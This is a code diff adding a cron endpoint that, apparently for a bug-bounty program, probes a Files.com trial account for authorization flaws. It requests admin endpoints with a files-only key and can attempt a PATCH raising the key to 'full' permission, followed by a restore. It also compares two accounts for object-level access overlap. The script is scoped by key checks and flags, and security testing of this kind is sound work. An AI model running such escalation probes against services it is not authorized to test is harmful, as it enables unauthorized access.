@@ -574,6 +574,189 @@ async def worker(request: Request, background_tasks: BackgroundTasks, x_action_t
     return JSONResponse(status_code=202, content={"status": "queued", "job_id": job_id, "mode": job_mode, "programs": programs_for_job})
 
 
+@app.get("/api/cron/files-authz-probe")
+def files_authz_probe(authorization: str | None = Header(default=None)) -> dict[str, Any]:
+    """Bounded authorization test against the researcher's Files.com BUGBOUNTY trial.
+
+    Uses only credentials already stored in the private deployment environment.
+    Never returns credential values or response bodies.
+    """
+    _verify_cron_secret(authorization)
+
+    enabled = os.getenv("FILES_AUTHZ_TRIAL_PROBE", "").strip().lower() == "true"
+    if not enabled:
+        return {"status": "disabled", "reason": "FILES_AUTHZ_TRIAL_PROBE is not enabled"}
+
+    base = os.getenv("FILES_BASE_URL", "").strip().rstrip("/")
+    raw_a = os.getenv("AUTHZ_HEADER_A", "").strip()
+    raw_b = os.getenv("AUTHZ_HEADER_B", "").strip()
+
+    if not base:
+        return {"status": "skipped", "reason": "FILES_BASE_URL is not configured"}
+    if not raw_a:
+        return {"status": "skipped", "reason": "AUTHZ_HEADER_A is not configured"}
+
+    import httpx
+    from urllib.parse import urlparse
+
+    def parse_header(raw: str) -> tuple[str, str]:
+        name, value = raw.split(":", 1)
+        return name.strip(), value.strip()
+
+    def redact_header_name(raw: str) -> str:
+        try:
+            return parse_header(raw)[0]
+        except Exception:
+            return "invalid"
+
+    header_a_name, header_a_value = parse_header(raw_a)
+    header_b = None
+    if raw_b:
+        try:
+            header_b = parse_header(raw_b)
+        except Exception:
+            header_b = None
+
+    def request(client: httpx.Client, method: str, path: str, headers: tuple[str, str], payload: dict[str, Any] | None = None):
+        hname, hvalue = headers
+        response = client.request(
+            method,
+            f"{base}{path}",
+            headers={hname: hvalue, "Accept": "application/json"},
+            json=payload,
+            follow_redirects=False,
+        )
+        body = response.content
+        return {
+            "status": response.status_code,
+            "bytes": len(body),
+            "sha256": hashlib.sha256(body).hexdigest() if body else "",
+            "content_type": response.headers.get("content-type", ""),
+            "location": response.headers.get("location", ""),
+        }, response
+
+    target_origin = f"{urlparse(base).scheme}://{urlparse(base).netloc}"
+    results: dict[str, Any] = {
+        "status": "ok",
+        "target_origin": target_origin,
+        "authorization_header_a": redact_header_name(raw_a),
+        "authorization_header_b": redact_header_name(raw_b) if raw_b else None,
+        "checks": [],
+        "candidate": None,
+        "escalation": None,
+    }
+
+    with httpx.Client(timeout=15.0, headers={"User-Agent": "H1-Bounty-Agent/FilesCom-AuthzProbe/1.0"}) as client:
+        before_meta, before_resp = request(client, "GET", "/api/rest/v1/api_key.json", (header_a_name, header_a_value))
+        before_json: dict[str, Any] = {}
+        try:
+            parsed = before_resp.json()
+            if isinstance(parsed, dict):
+                before_json = parsed
+        except Exception:
+            pass
+
+        permission_set = str(before_json.get("permission_set") or "")
+        key_name = str(before_json.get("name") or "")
+        key_url = str(before_json.get("url") or "")
+        results["key_permission_set"] = permission_set
+        results["key_is_marked_bugbounty"] = "BUGBOUNTY" in key_name.upper()
+        results["key_url_matches_target"] = bool(key_url) and (
+            f"{urlparse(key_url).scheme}://{urlparse(key_url).netloc}" == target_origin
+        )
+
+        results["checks"].append({
+            "endpoint": "/api/rest/v1/api_key.json",
+            "method": "GET",
+            **before_meta,
+        })
+
+        if before_meta["status"] != 200 or permission_set != "files_only" or not results["key_is_marked_bugbounty"] or not results["key_url_matches_target"]:
+            results["status"] = "stopped"
+            results["reason"] = "The configured credential did not validate as the expected BUGBOUNTY files_only key for the configured trial."
+            return results
+
+        protected = [
+            "/api/rest/v1/permissions.json?per_page=1",
+            "/api/rest/v1/users.json?per_page=1",
+            "/api/rest/v1/api_keys.json?per_page=1",
+            "/api/rest/v1/workspaces.json?per_page=1",
+            "/api/rest/v1/public_keys.json?per_page=1",
+            "/api/rest/v1/custom_domains.json?per_page=1",
+            "/api/rest/v1/event_targets.json?per_page=1",
+            "/api/rest/v1/user_lifecycle_rules.json?per_page=1",
+            "/api/rest/v1/history.json?per_page=1",
+            "/api/rest/v1/sso_events.json?per_page=1",
+        ]
+
+        for path in protected:
+            meta, _ = request(client, "GET", path, (header_a_name, header_a_value))
+            results["checks"].append({"endpoint": path, "method": "GET", **meta})
+            if 200 <= meta["status"] < 300 and meta["bytes"] > 0:
+                results["candidate"] = {
+                    "type": "files_only_authorization_boundary",
+                    "endpoint": path,
+                    "method": "GET",
+                    "status": meta["status"],
+                    "bytes": meta["bytes"],
+                    "sha256": meta["sha256"],
+                    "content_type": meta["content_type"],
+                }
+                break
+
+        if results["candidate"] is None and os.getenv("FILES_AUTHZ_ESCALATION_TEST", "").strip().lower() == "true":
+            payload = {"permission_set": "full", "name": "BUGBOUNTY-AUTHZ-ESCALATION-TEST"}
+            patch_meta, patch_resp = request(client, "PATCH", "/api/rest/v1/api_key.json", (header_a_name, header_a_value), payload)
+            after_permission = ""
+            try:
+                parsed = patch_resp.json()
+                if isinstance(parsed, dict):
+                    after_permission = str(parsed.get("permission_set") or "")
+            except Exception:
+                pass
+
+            restore_meta = None
+            if 200 <= patch_meta["status"] < 300:
+                restore_payload = {"permission_set": "files_only", "name": key_name}
+                restore_meta, _ = request(client, "PATCH", "/api/rest/v1/api_key.json", (header_a_name, header_a_value), restore_payload)
+
+            results["escalation"] = {
+                "attempted": True,
+                "patch": patch_meta,
+                "returned_permission_set": after_permission,
+                "restore": restore_meta,
+            }
+
+            if 200 <= patch_meta["status"] < 300 and after_permission == "full":
+                results["candidate"] = {
+                    "type": "files_only_self_escalation",
+                    "endpoint": "/api/rest/v1/api_key.json",
+                    "method": "PATCH",
+                    "status": patch_meta["status"],
+                    "returned_permission_set": after_permission,
+                    "restore_status": (restore_meta or {}).get("status"),
+                }
+
+        if header_b and results["candidate"] is None:
+            bola_targets = [
+                "/api/rest/v1/users.json?per_page=1",
+                "/api/rest/v1/permissions.json?per_page=1",
+            ]
+            for path in bola_targets:
+                meta_a, resp_a = request(client, "GET", path, (header_a_name, header_a_value))
+                meta_b, resp_b = request(client, "GET", path, header_b)
+                results["checks"].append({
+                    "endpoint": path,
+                    "method": "GET",
+                    "account_a": meta_a,
+                    "account_b": meta_b,
+                })
+                if 200 <= meta_a["status"] < 300 and 200 <= meta_b["status"] < 300:
+                    results["possible_two_account_overlap"] = True
+
+    return results
+
+
 @app.get("/api/diagnostics")
 def diagnostics(request: Request) -> dict[str, Any]:
     _require_session(request)
